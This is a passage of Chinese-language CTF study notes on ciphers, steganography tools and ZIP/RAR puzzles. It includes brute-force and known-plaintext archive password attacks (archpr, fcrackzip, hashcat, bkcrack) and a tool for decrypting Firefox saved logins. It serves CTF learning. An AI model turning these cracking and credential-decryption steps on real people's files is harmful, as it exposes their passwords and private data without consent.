re.match(&quot;^[^-\&#x27;]+$&quot;,text.decode()) is not None:            return 5    except:        pass    return 5def autoDec(text):    floor = 0    while True:        try:            code = detect(text)            text = baseDec(text,code)            floor += 1            print(&quot;第&#123;0&#125;层：\n&quot;.format(floor),text)            if not text:break        except:            breakif __name__ == &quot;__main__&quot;:    # with open(&quot;Autopy/crypto/doc/form&quot;,&#x27;rb&#x27;) as f:    #     content = f.read()    content = &quot;@iH&lt;,&#123;*;oUp/im\&quot;QPl`yR*ie&#125;NK;.D!Xu)b:J[Rj+6KKM7P@iH&lt;,&#123;*;oUp/im\&quot;QPl`yR&quot;.encode()    #修改content内容    autoDec(content)







MD5加密解密加密网站（适用于让你包上md5提交的）： https://www.geekstool.com/tool/md5
凯撒加密凯撒加密的原理是换位，我们需要注意换位的key会不会变化
如果key会变的话我们需要编写脚本来解密了
如果没有的话直接cyberchef或者随波逐流都可
brainfuck加密注意对开头的内容有要求
-随波逐流里有
-网站：https://www.splitbrain.org/services/ook
Ook! Obfuscation加密-网站：https://www.splitbrain.org/services/ook
serpent加密（蛇对称加密算法）-网站：http://serpent.online-domain-tools.com
颜文字加密（aaencode&#x2F;jjencode&#x2F;ppencode&#x2F;uuencode&#x2F;xxencode)-aaencode随波逐流里面有
-其他的可以用在线网站http://www.hiencode.com/
emoji-aes加密解密需要密钥
类似于
🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🔬👣🖐🌏😇🥋😇😊🍎🏹👌🌊☃🦓🌏🐅🥋🚨📮🐍🎈📮📂✅🐍⏩⌨🎈😍🌊😇🐍☺💧🥋🍌🎤🍍😇👁🦓😇🍍📮📂🎅😡🍵✖✉🏹⌨🍵🎤😆🍵🚹🏹🍎🚨ℹ☃👑🎤🚪💵😎😀😎🔬💵🦓🏹👉🦓✖😀🐘🔪⌨🎈🥋👌🍌🚹😂✉🍎🍌🏎👌🏹💵👌👁🎃🗒

这种全是emoji的加密，使用在线网站： emoji-aes
注意base100也是emoji这样的
音符加密解密网站： 文本加密为音乐符号,可自设密码|文本在线加密解密工具
手机九宫格加密第一种每组数字只有两个，类似于82  73  42  31  22  31  33  41  32这种
对照表如下：



密码
明文
密码
明文



11
:
61
m


12
_
62
n


13
-
63
o


21
a
71
p


22
b
72
q


23
c
73
r


31
d
74
s


32
e
81
t


33
f
82
u


41
g
83
v


42
h
91
w


43
i
92
x


51
j
93
y


52
k
94
z


53
l




第二种类似于
999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777

这种
直接手机九宫格上打就好了，次数对应长按的第几个。
AES-ECB加密可以用cyberchef
可以用脚本，如下：
import base64from Crypto.Cipher import AESdef aes_decrypt(data, key):    key = key.encode(&#x27;utf-8&#x27;)+b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#x27;    cipher = AES.new(key, AES.MODE_ECB)    decrypted = cipher.decrypt(base64.b64decode(data))    return decrypted    if __name__ == &quot;__main__&quot;:    data = &#x27;Kln/qZwlOsux+b/Gv0WsxkOec5E70dNhvczSLFs+0pkHaovEOBqUApBGBDBUrH08&#x27; #加密的文本    for i in range(100000,999999):        key = str(i)        res = aes_decrypt(data=data,key=key)        res = str(res)        if &#x27;flag&#x27; in res or &#x27;DASCTF&#x27; in res:   #关键词            print(f&quot;key:&#123;key&#125;&quot;)            print(f&quot;flag:&#123;res&#125;&quot;)            break



alphuck代码加密一种怪异的编程语言
内容类似于
iiciccepepceaiiiaiaiaicccsascciijceeeeeejccijjccjcejaajaajcccjeeejaajaaijcccej

在线网站： alphuck在线运行,在线工具，在线编译IDE_w3cschool
autokey加密一种加密方式，python2运行
项目地址： hotzzzzy&#x2F;breakautokey: breakautokey
需要修改break_autokey.py里面密文的值然后运行
ToyCipher加密一种加密方式，对照表： 301.pdf
脚本转化：
cipherdic = &#123;&#x27;M&#x27;:&#x27;ACEG&#x27;,&#x27;R&#x27;:&#x27;ADEG&#x27;,&#x27;K&#x27;:&#x27;BCEG&#x27;,&#x27;S&#x27;:&#x27;BDEG&#x27;,&#x27;A&#x27;:&#x27;ACEH&#x27;,&#x27;B&#x27;:&#x27;ADEH&#x27;,&#x27;L&#x27;:&#x27;BCEH&#x27;,&#x27;U&#x27;:&#x27;BDEH&#x27;,&#x27;D&#x27;:&#x27;ACEI&#x27;,&#x27;C&#x27;:&#x27;ADEI&#x27;,&#x27;N&#x27;:&#x27;BCEI&#x27;,&#x27;V&#x27;:&#x27;BDEI&#x27;,&#x27;H&#x27;:&#x27;ACFG&#x27;,&#x27;F&#x27;:&#x27;ADFG&#x27;,&#x27;O&#x27;:&#x27;BCFG&#x27;,&#x27;W&#x27;:&#x27;BDFG&#x27;,&#x27;T&#x27;:&#x27;ACFH&#x27;,&#x27;G&#x27;:&#x27;ADFH&#x27;,&#x27;P&#x27;:&#x27;BCFH&#x27;,&#x27;X&#x27;:&#x27;BDFH&#x27;,&#x27;E&#x27;:&#x27;ACFI&#x27;,&#x27;I&#x27;:&#x27;ADFI&#x27;,&#x27;Q&#x27;:&#x27;BCFI&#x27;,&#x27;Y&#x27;:&#x27;BDFI&#x27;&#125;ciphertext = &#x27;&#x27;with open(&#x27;signin.txt&#x27;,&#x27;r&#x27;) as f:    #读取signin.txt    f = f.read()    for i in range(0,len(f),4):        block = f[i:i+4]        for j in cipherdic:            if block == cipherdic[j]:                ciphertext += j                #print(&#x27;&#123;&#125;: &#123;&#125;&#x27;.format(block,j))print(ciphertext)



奇奇怪怪的加密有一些奇怪的加密可以尝试去随波逐流找找看
随波逐流&#x2F;其他工具&#x2F;更多图形密码（在线）
TXT文本隐写思路：看是什么隐写了，是NTFS？还是snow？还是什么
NTFS交换数据流（简称ADS）  NTFS交换数据流（简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，而我们无法查看到非主文件数据流，因文件夹大小始终显示0

注意ntfs的压缩包要用WinRAR解压，否则可能解压不出来ntfs流

  以下是进行文件流计生和查看的方法，以后在windows命令行下查看文件，都用 dir &#x2F;r

寄生一:
echo 写入内容&gt;&gt;宿主文件:交换数据流文件(寄生文件)
echo ever&gt;&gt;1.txt:2.txt
2.txt为echo创建出交换数据流文件，ever在2.txt中
寄生二:
type 交换数据流文件(寄生文件)&gt;&gt;宿主文件夹:交换数据流文件(寄生文件)
type 2.txt&gt;&gt;temp:2.txt
temp为空文件夹,执行后2.txt寄生在temp文件夹上
type a.jpg&gt;&gt;temp:a.jpg
temp为空文件夹,执行后a.jpg寄生在temp文件夹上
查看:
notepad 宿主文件:交换数据流文件(寄生文件）
notepad 1.txt:2.txt
查看图片文件:
mspaint 宿主文件:交换数据流文件(寄生文件)
notepad a.jpg:b.jpg
过滤
dir &#x2F;r | findstr $DATA （过滤DATA字符串）

例题可以看BUUctf的 [SWPU2019]我有一只马里奥
网站讲解： https://zhuanlan.zhihu.com/p/654643812
工具：NtfsStreamsEditor或AlternateStreamView
snow加密需要密码，当然也可以无密码解密
snow.exe -p password -C encoded.txt



零宽字符零宽度字符是一些不可见的，不可打印的字符。它们存在于页面中主要用于调整字符的显示格式。它们在文本中占有位置却不显示
零宽字符的特征还是蛮明显的，发现了就直接网站解密就好： Unicode Steganography with Zero-Width Characters
或者随波逐流里面有零宽字符解密。
字频统计有一些txt里面是一堆东西比如字母之类的，实际上是要我们统计字频
其实一般来说有大量的文本内容就应该试试是不是统计字频
可以使用puzzlesolver
空格-Tab隐写一个txt全选会发现有很多空白内容
sunblime&#x2F;notepad++打开会发现有很多空格和Tab
这种一般是莫斯密码，手敲一下然后转化就行
encrypto文件一个加密软件，需要密钥
解密这种文件的话需要加上.crypto后缀名，否则是加密
这个加密方式对文件的16进制内容要求很严格，如果在确信是这种加密和密钥正确的情况下跑了很久都没出的话，可以试试010打开文件看看16进制有没有问题（比如有干扰的字符的话就跑不出来）
火狐登录凭证一般是logins.json
建议使用firepwd：lclevy&#x2F;firepwd: firepwd.py, an open source tool to decrypt Mozilla protected passwords
安装库（建议在虚拟机上搞）
plaintextpip install -r requirements.txt

如果crypto报错（kali上搞）
plaintextpip uninstall crypto pycryptodomepip install pycryptodome

然后
plaintextpython firepwd.py logins.json



3D打印命令命令大概长这样


3D打印的命令，命令大全： 3D打印gcode命令大全及解析_move exceeds maximum extrusion-CSDN博客
改后缀为gcode，在线查看网址： gcode viewer - online gcode viewer and analyzer in your browser!
如果看不清的话 在2D渲染里面把干扰项去掉就行
不同编码不同编码下的txt内容如果选择不正确的编码的话肯定看不出来
如果看到乱码的话可以多试试其他编码，如utf16，utf8，ebcdic等等
1.EBCDIC编码： 什么是 EBCDIC 收集了有关计算机普及的最新文章 - Hatena
在010的视图里面选择EBCDIC，就能看到了
反转文本有时候遇到打开文本，能观察出这个文本是反转过的（因为发现了文件头或者别的什么东西）
可以使用puzzlesolver的反转或者试试cyberchef的reverse项（没那么好用，建议一般找ai跑脚本）
或者使用脚本反转回来，这里脚本仅处理一种情况，最终还是得ai跑。
with open(&#x27;E:/python3.7/1.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:  #记得改路径    text = file.read()# 将文本按空格分隔成列表hex_numbers = text.split()# 反转每个十六进制数字，并转换为大写reversed_hex_numbers = [num[::-1].upper() for num in hex_numbers]# 每16个数字分为一行lines = []for i in range(0, len(reversed_hex_numbers), 16):    line = &#x27; &#x27;.join(reversed_hex_numbers[i:i+16])    lines.append(line)# 将所有行连接成最终文本reversed_text = &#x27;\n&#x27;.join(lines)with open(&#x27;E:/python3.7/reversed_document.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:    file.write(reversed_text)





sunblime&#x2F;notepad++有时候什么东西都看不到，感觉类似于无字天书。可以复制进sunblime看看
而且感觉sublime text与notepad++一样，都是查看东西的，记事本打不开的话可以试试，有很多莫名奇妙的后缀文件一般都可以打开。
图片题思路：可以先拖进随波逐流看看
没有再010看看有无隐写
实在不行看看文件属性里有没有备注
压缩了宽高有些题目会压缩图片宽高，我们需要爆破出来，jpg可以乱改宽高，png不行，需要知道原本的宽高。
1.随波逐流把文件拖进去会自己分析，如果压缩了宽高会自己爆破回来，很好用
2.010可以自己修改宽高
png爆破crc脚本实测这个脚本在宽高比较低的时候好用，超过1000就不好用了，爆破得很慢
#使用python3爆破png图片的宽高数据import osimport binasciiimport structfor i in range(20000):#一般 20000就够    wide = struct.pack(&#x27;&gt;i&#x27;,i)    for j in range(20000):        high = struct.pack(&#x27;&gt;i&#x27;,j)        data = b&#x27;\x49\x48\x44\x52&#x27; + wide+ high+b&#x27;\x08\x02\x00\x00\x00&#x27;        #因为是 Py3，byte和str型不能直接进行运算，要写把 str写 b&#x27;...&#x27;。不然把 wide和 high写成 str(...)        crc32 = binascii.crc32(data) &amp; 0xffffffff        if crc32 == 0x90BECB72:  # 0x90BECB72是这个 png文件头的 CRC校验码，在 21~25byte处            print(&#x27;\n\n&#x27;,i,j,crc32)   #0x 后的数字为十六进制中crc位置的代码（winhex左016，13-下一行的0）            print(type(data))            exit(0)    print(i,end=&#x27; &#x27;)



stegdetect这个是用来检查图片是什么隐写的
我这里下的是windows版本，对应目录下cmd
stegdetect.exe  图片路径



outgruss隐写outguess -k ‘key’ -r 加密后的图片.jpg -t 明文.txt



F5-steganography题目可能会提示关于刷新一类的字眼
装好工具后
cd F5-steganography

再
java Extract 1.jpg -p 123456 #-p后接f5的key

有时候报错需要我们加上
--add-opens java.base/sun.security.provider=ALL-UNNAMED



steghide直接跑
steghide extract -sf stg.jpg或steghide extract -sf filename -p passwd



stegseek跑
stegseek --seed example.jpg



pngcheck——png图像修复检查png的chunk
pngcheck -v decode.png

如果检查出来如 invalid chunk name “0000” (30 30 30 30)
就去010把对应的chunk 0000 修改为 IDAT
oursecret隐写一种隐写方式，需要密码。
特征是010打开会发现有一个多余的部分，并且开头是9E 97 BA 2A
binwalk和formost提取如果有文件隐写在图片里面，可以尝试binwalk和formost提取一下
附一个图片题分析网站： Aperi’Solve ，也不知道有没有用（）
silghteye隐写特征：放大图像后会有行列不对齐的小灰块
直接用 silenteye 打开输入密钥decode即可，默认密钥是 silenteye
下载地址： SilentEye - Steganography is yours
LSB隐写stegsolvelsb是利用人眼看不到的原理在最低位隐写内容
stegsolve可以查看图片的LSB通道，如果是最低位lsb隐写的话可以stegsolve一下
运行stegsolve
java -jar stegsolve.jar

需要电脑配置好了java环境变量
stegsolve可以看到最低位的一些数据，然后手动save bin，再用010转化
zsteg——无密钥zsteg -a (文件名)  #查看各个通道的lsb-b的位数是从1开始的 zsteg zlib.bmp -b 1 -o xy -v提取文件并导出 zsteg -e b1,r,lsb,xy 3.png &gt; 123.jpg

感觉stegsolve更好用
cloacked-pixel——有密钥先
cd cloacked-pixel

再
python2 lsb.py extract encoded.png result.txt 123456 #encoded.png 是加密的图片#result.txt是解密后的文档，不确定格式的话可以改成out.data#123456是密钥

最后
cat result.txt



盲水印用puzzlesolver的fft（傅里叶变换）
双图盲水印也可以puzzlesolver
提取等距像素点特征：放大图片后看到一个个小的像素点
提取方法1：PS


将宽度高度&#x2F;10 重新采样选择 临近（硬边缘）
或者在调宽高的时候用鼠标滚轮来调，能更精细一点
但是实测出来效果不佳，得到的图片很糊
方法二：脚本
import osimport reimport cv2import argparseimport itertoolsimport numpy as npparser = argparse.ArgumentParser()parser.add_argument(&#x27;-f&#x27;, type=str, default=None, required=True,                    help=&#x27;输入文件名称&#x27;)parser.add_argument(&#x27;-p&#x27;, type=str, default=None, required=True,                    help=&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;)parser.add_argument(&#x27;-n&#x27;, type=str, default=None, required=True,                    help=&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;)parser.add_argument(&#x27;-size&#x27;, type=str, default=&#x27;1x1&#x27;, required=False,                    help=&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;)parser.add_argument(&#x27;-resize&#x27;, type=int, default=1, required=False,                    help=&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;)args  = parser.parse_args()if __name__ == &#x27;__main__&#x27;:    if re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.p) and re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.n) and re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.size):        x1, y1 = map(lambda x: int(x), args.p.split(&quot;+&quot;)[0].split(&quot;x&quot;))        x2, y2 = map(lambda x: int(x), args.p.split(&quot;+&quot;)[1].split(&quot;x&quot;))        width, height = map(lambda x: int(x), args.n.split(&quot;x&quot;))        width_size, height_size = map(lambda x: int(x), args.size.split(&quot;x&quot;))        img_path = os.path.abspath(args.f)        file_name = img_path.split(&quot;\\&quot;)[-1]        img = cv2.imread(img_path, cv2.IMREAD_COLOR)        row, col = img.shape[:2]        r, c = len(range(y1, y2 + 1, height)), len(range(x1, x2 + 1, width))        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, 3))        for y, x in itertools.product(range(r), range(c)):            for y_size in range(height_size):                for x_size in range(width_size):                    # new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-1)                    # cv2.imshow(new_img)        cv2.imwrite(f&quot;_&#123;file_name&#125;&quot;, new_img)        print(&quot;已保存到运行目录中...&quot;)    else:        print(&quot;参数-p或参数-n或参数-size, 输入错误!&quot;)

python脚本跑的更精确一点，需要知道图片像素起始位置和结束位置，以及像素之间的间距（可以在PS里知道）
输入以下代码：（要注意有时候跑不出来可以复制到桌面上试试）
python get_pixels.py -f comeon.png -p 0x0+3828x2148 -n 12x12# comeon.png 是待解密图片# 0x0 是图片里像素点起始位置，3828x2148 是图片里像素点结束位置# 12x12 是图片的像素点间距

这个脚本跑出来更精细一点，也更推荐
IDAT数据块隐写这种得先用pngcheck看哪个数据块不对劲
pngcheck -v 1.png

比如哪个数据块跟其他的大小长度不同等
然后010手动把这个数据块提出来，补上png头就是一个新的png
例题：2024 DASCTF 暑期挑战赛 png_master
cimbar对照表（简单的），项目地址： https://github.com/sz3/cimbar




exiftool分析图片信息，如GPS查看信息，记得要在对应目录下开终端
.\exiftool 1.jpg

查看GPS
.\exiftool -gps:all 1.jpg



Arnold猫脸变换参考链接： https://1cepeak.cn/post/arnold/
解密需要提供打乱次数，a，b 。
加密 &#x2F; 解密代码：
# -*- coding: UTF-8 -*-import matplotlib.pyplot as pltimport cv2import numpy as npfrom PIL import Imageimg = cv2.imread(&#x27;flag.png&#x27;)if img is None:    print(&quot;图像加载失败，请检查文件路径或格式&quot;)    exit()def arnold_encode(image, shuffle_times, a, b):    &quot;&quot;&quot; Arnold shuffle for rgb image    Args:        image: input original rgb image        shuffle_times: how many times to shuffle    Returns:        Arnold encode image    &quot;&quot;&quot;    # 1:创建新图像    arnold_image = np.zeros(shape=image.shape)        # 2：计算N    h, w = image.shape[0], image.shape[1]    N = h   # 或N=w        # 3：遍历像素坐标变换    for time in range(shuffle_times):        for ori_x in range(h):            for ori_y in range(w):                # 按照公式坐标变换                new_x = (1*ori_x + b*ori_y)% N                new_y = (a*ori_x + (a*b+1)*ori_y) % N                                # 像素赋值                print(image[ori_x, ori_y, :])                print(arnold_image[new_x, new_y, :])                arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :]    cv2.imwrite(&#x27;flag_arnold_encode.png&#x27;, arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])    return arnold_imagedef arnold_decode(image, shuffle_times, a, b):    &quot;&quot;&quot; decode for rgb image that encoded by Arnold    Args:        image: rgb image encoded by Arnold        shuffle_times: how many times to shuffle    Returns:        decode image    &quot;&quot;&quot;    # 1:创建新图像    decode_image = np.zeros(shape=image.shape)    # 2：计算N    h, w = image.shape[0], image.shape[1]    N = h  # 或N=w    # 3：遍历像素坐标变换    for time in range(shuffle_times):        for ori_x in range(h):            for ori_y in range(w):                # 按照公式坐标变换                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N                new_y = ((-a) * ori_x + ori_y) % N                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]    cv2.imwrite(&#x27;flag.png&#x27;, decode_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])    return decode_image# arnold_encode(img, 1, 2, 3)arnold_decode(img, 1, 29294, 7302244)

如果报错如下：
   decode_image &#x3D; np.zeros(shape&#x3D;image.shape) AttributeError: ‘NoneType’ object has no attribute ‘shape’
可以修改如下：
# 1:创建新图像，指定 dtype 为 uint8    arnold_image = np.zeros(shape=image.shape, dtype=np.uint8)



色彩图提取颜色值一般会给一张图片，里面有几种颜色
我们可以使用ps-取色器来提取其中的颜色的RGB的16进制值


然后拼接转ascii
apng&#x2F;bpg这种图片一般的图片编辑器打不开
1.apng
apng简介： 科普（APNG） - 哔哩哔哩
可以使用firefox打开
2.bpg
地址： 发行版 Simple BPG Image viewer · asimba&#x2F;pybpgviewer
GIFgif一般是拆分gif
以及帧间隔里面可能藏东西
使用puzzlesolver即可
二维码
[!NOTE]
扫描二维码实用排行:
T0：Binary Eye、Umi-OCR
T0.5：在线网站 
T1：CQR
T2：微信、夸克等
特殊：中国编码app、半张二维码手动补全：QRazyBox - QR Code Analysis and Recovery Toolkit

.
1.得到的二维码可以用CQR扫一下，或者微信扫一下
在线二维码解码网站： https://qrcode-decoder.com
如果以上都没扫出来的话可以手机上下一个Binary Eye扫一下，或者用Umi-OCR（没想到吧这个也能扫二维码）试试看
注意汉信码扫不出来，需要去下中国编码app来扫（又称中国的二维码，特点就是四个角，且左下角方向是反的。）
汉信码例子长相：




2.二维码也容易出拼接题目。如果是拼接题的话可以用PS或者PPT（修复同理）
拼图题一般来说是碎的图片修复一下，有两种方式
1.PS&#x2F;PPT
可以用ppt来拼接图片，如果不行就用ps，需要ps的熟练度
2.gaps&#x2F;Puzzle-Merak
如果是一个文件夹下面多个碎掉的图片，我们先把他们拼成一张的
montage *.PNG -tile 10x12 -geometry +0+0 out.png*.png表示匹配所有图片（这里也可以换成.jpg）-tile表示图片的张数-geometry +0+0表示每张图片的间距为0合成后要先查看图片的宽高（宽高要相等，不相等要用PS调整）

然后就能得到一张全是碎图片拼接起来的图片了，顺序此时还没恢复过来。
①gaps
png的
gaps --image=out.png --generation=30 --population=144 --size=30 --save --image 指向拼图的路径--size 拼图块的像素尺寸--generations 遗传算法的代的数量--population 个体数量--verbose 每一代训练结束后展示最佳结果--save 将拼图还原为图像

jpg的
gaps --image=flag.jpg --generations=50 --population=180 --size=125 --verbose-generations 你要迭代多少次-population 你有多少个小拼图--size 每张小图，也就是拼图小块的大小--verbose 实时显示

②Puzzle-Merak
注意新建的时候要看好图片的像素大小！
选择脚本-自动拼接（gaps）
这里需要我们填写generation、population、size 并用分号分开
–generations 遗传算法的代的数量
–population 个体数量
–size 拼图块的像素尺寸
PDF题编辑pdf例如那种把图片底下有东西的题目
-在线网站 https://tool.lu/pyc/
或者可以尝试使用pdf转word，然后编辑word
或者用PS打开，看隐藏图层
音频题思路：拿到不管三七二十一先拖进audacity看一下
摩斯密码看频谱图的时候如果发现是摩斯密码我们直接对着摩斯密码手敲解密
拨号音隐写——DTMF听着像是在拨号一般的声音，频谱图发现


类似这样的是DTMF隐写
需要我们手敲
把最高和最低一一对应

[!NOTE]
注意DTMF中频率只有697 Hz、770 Hz、852 Hz、941 Hz、 1209 Hz、1336 Hz、1477 Hz 和 1633 Hz

上图手敲得到
1336-697 1336-941 1336-697 1209-770 1336-941 1477-852 1477-697 1336-941 1336-697 1336-941 1336-697 1209-770 1209-697 1209-697 1336-941 1477-697

然后复制进网站解密即可： https://www.dcode.fr/dtmf-code#:~:text&#x3D;A DTMF code for dual-tone multi-frequency
也可以试着把音频直接拖进随波逐流分析，或者在线网站： Detect DTMF Tones
SSTV慢扫描github项目： https://github.com/colaclanth/sstv
sstv -d audio_file.wav -o result.png

注意解码出来是一张图片
然后查看图片
eog result.jpg 或者v3m result.jpg

。
如果github的sstv扫不出来的话可以使用RX-SSTV
项目下载地址： https://www.qsl.net/on6mu/rxsstv.htm
可以配一个虚拟声卡使用，当然也可以直接扬声器。
deepsound如果把音频拖进deepsound解密要密码的话一般就是deepsound隐写
密码看有没有其他地方得到
或者利用deepsound2john.py得到这个音频文件的哈希值后再john破解
silghteye隐写当然音频也可以slighteye隐写，默认密码是silghteye
窄带FM调制一般拿到文件是GNU Radio流图的配置，它描述了一个无线通信系统的信号处理过程，包括信号生成、滤波、调制、解调等步骤。
利用 GNU Radio打开
gnuradio-companion file_name.grc



PT2242信号即电单车的解锁信号
前面4bit表示同步码，中间的20bit表示地址码，后面的4bit表示功能码，最后一位是停止码。
我们直接以时间的长短来表示0和1，打出二进制就好
ZIP题思路：zip有密码先看是不是伪加密，再看能不能爆破出来，要不要明文攻击，有没有注释，还有可能是脑洞。。
手动修复zip文件可以看看 其他 &amp;&amp; 工具里的 010editor .zip模板对照表
伪加密压缩源文件数据区：7-8位是frFlag
压缩源文件目录区：9-10位是deFlag
一般的出题人会修改这两个地方为奇数，从而显示出伪加密的样子
一般这俩地方都是09 00的，大概率就是伪加密了，具体可看zip文件结构
详细可以见我这篇博客 关于ZIP伪加密 | MetaVi
省流版：



工具
建议&#x2F;判断位置



010
建议两个区都修一下


bandizip&#x2F;winrar
判断dirEntry区中的deflag位


7zip
判断record区的frFlag位


随波逐流修复伪加密
只修改dirEntry区中的deflag位，不管frFlag位


ZipCenOp
不好用！


直接爆破1.archpr
如果已知zip的密码很弱可以直接使用archpr来爆破密码
实际上感觉这个也用的比较多
注意archpr不支持rar5的爆破
2.fcrackzip
kali的工具
fcrackzip -u -v -D -p PASSWORD_FILE ZIP_FILE#-u 表示使用暴力攻击模式#-v 表示详细输出#-D 表示使用字典攻击模式#-p PASSWORD_FILE 表示指定密码字典文件#ZIP_FILE 表示要破解的 ZIP 文件

我没怎么用过，感觉应该没有archpr好用
3.passwarekit
也可以用这个工具，比archpr好用，这个能爆破许多东西
4.rar5爆破
rar5爆破可以使用rar2john+hashcat
先
rar2john 1.rar

会得到哈希值
然后hashcat爆破
.\hashcat.exe -m 13000 -a 3 rar_hash GW?a?a?a?a#修改这个rar_hash，windows下hash值不用加引号，kali下加引号





CRC32爆破项目地址： https://github.com/allblue147/zip-crc-tools
crc爆破是里面文件很短，一般只有几字节的情况下
python .\main.py -f decode.zip

特别需要注意的是要保证 zip 及里面 txt 的名字不能出现中文，有的话重命名一下
掩码爆破已知部分明文，而且知道密钥的位数的情况下使用掩码爆破
利用archpr进行掩码爆破，不知道的部分改为  ? （注意是英文的问号）
多个压缩包脚本解压1.多个压缩包带密码
适用于有多个压缩包，而且密码是压缩包的名字
当然此类的压缩包还有很多，需要很多脚本，可以尝试ai跑
import osimport zipfile  def extract_and_store_final_file(initial_zip_path, target_dir):    if not os.path.exists(target_dir):        os.makedirs(target_dir)     current_zip_path = initial_zip_path     password = os.path.basename(initial_zip_path)[:4]     while True:        with zipfile.ZipFile(current_zip_path, &#x27;r&#x27;) as zip_ref:            files = zip_ref.namelist()            file_name = files[0]            next_zip_name = os.path.join(target_dir, file_name)            try:                zip_ref.extractall(target_dir, pwd=bytes(password, &#x27;utf-8&#x27;))                print(f&quot;Extracted &#123;file_name&#125; to &#123;target_dir&#125; using password &#123;password&#125;&quot;)            except RuntimeError as e:                print(f&quot;Error extracting &#123;file_name&#125;: &#123;e&#125;&quot;)                break             if file_name.endswith(&#x27;.zip&#x27;):                current_zip_path = next_zip_name                password = file_name[:4]            else:                 print(f&quot;The final file is &#123;file_name&#125;, stored in &#123;target_dir&#125;&quot;)                break   initial_zip_path = &#x27;0573.zip&#x27; #第一个解密的压缩包名称target_dir = &#x27;flag&#x27; #放进的文件夹extract_and_store_final_file(initial_zip_path, target_dir)

2.压缩包套娃，无密码
bash脚本：
while [ &quot;`find . -type f -name &#x27;*.tar.xz&#x27; | wc -l`&quot; -gt 0 ]; do find -type f -name &quot;*.tar.xz&quot; -exec tar xf &#x27;&#123;&#125;&#x27; \; -exec rm -- &#x27;&#123;&#125;&#x27; \;; done;





一些tips1.如果是连环套压缩包而且有zips，rar，7z等格式的小心是后缀换成摩斯密码解密。
2.空白名文件：出题人可能会把里面文件名字改为空白的，这样bandizip就解压不了了，多试试7zip解压吧！
3.多用用010的模板功能来看压缩包
4.如果解压时报错的话可以对照模板010修改一下里面的东西    该文件已损坏-可能是源数据区和目录区的文件名长度（ushort frfilenamelength 或者 defilenamelength）被修改了    CRC校验错误-可能是源数据区或目录区的压缩方法（enum COMPTYPE frCompression 或者 deCompression）被修改了
Zlib解压适用于那些没有加密的zip（题目大多是那种压缩包损坏而frdata不变的）
直接把frdata复制出来——即010模板里面record区域的frdata内容
加上78 9C 的zlib文件头，放到cyberchef里面选择from hex和zlib inflate就能看到原本的内容了
明文攻击明文攻击条件：算法是zipcrypto，压缩方式是store或者少部分是default，已知12字节，其中至少8字节连续。
已知的内容可以是png头，zip头，exe固定内容，svg固定内容，pcapng内容，xml等
pkcrack——已知所有的明文或三段密钥（这个用的很少）
命令
pkcrack -c &quot;README.txt&quot; -p README.txt -C flag.zip -P README.zip

方法
-C:要破解的目标文件(含路径)-c:破解文件中的明文文件的名字(其路径不包括系统路径,从zip文件一层开始)-P:压缩后的明文文件-p:压缩的明文文件中明文文件的名字(也就是readme.txt在readme.zip中的位置)

三段密钥已知了的话也可以用Advanced Archive Password Recovery
bkcrack——已知部分明文&#x2F;部分文件的所有明文（可以去试试bkcrack_gui）
参数
-c 要解密的文件-P 已知明文所在的压缩包-p 已知的明文部分-x 压缩包内目标文件的偏移地址  部分已知明文值-C 加密压缩包-o offset  -p参数指定的明文在压缩包内目标文件的偏移量-k 后面加破解出的三段密钥-d 后面加解密后数据的保存位置-U 修改压缩包密码并导出	bkcrack -C flag.zip -c hint.jpg -k afb9fee3 f8795353 f6de1d4e -U out.zip 114514



1.已知部分文件里的部分明文
至少已知明文的12个字节及偏移，其中至少8字节需要连续。明文对应的文件加密方式为ZipCrypto StoreTips：进行明文攻击前要判断制作压缩包的压缩工具，然后对已知明文使用特定工具进行压缩，再进行明文攻击例子：bkcrack -C \$R9EG7XR.zip -c flag.txt -k 958597ea b9f7740b 622aed5e -d flag.txt

已知的部分明文可以是zip的文件名字
2.已知一个zip里的一个文件的全部内容
例如一个zip里包含 flag.txt 和 md5.txt，可以
bkcrack -C 222.zip -c md5.txt -P 11.zip -p flag.txt# 222.zip是待解密zip，md5是已知的txt# 新建一个flag.txt，内容是md5一样的，打包成11.zip

或者可以
bkcrack -C 222.zip -c important-md5.txt  -p flag.txt# 不打包成11.zip

就可以明文攻击三段密钥了。
3.已知三串密钥
&#x3D;&gt;&gt;拿到了三串密钥之后可以改加密密码另存文件
bkcrack -C 222.zip -k 119be489 086fed79 8cbf1ed7 -U out.zip 1234# 222.zip是待解密的zip# -k后面跟的是三段密钥# -U 表示转出为out.zip，密码是1234

或者爆破出原本密码（知道密码长度）
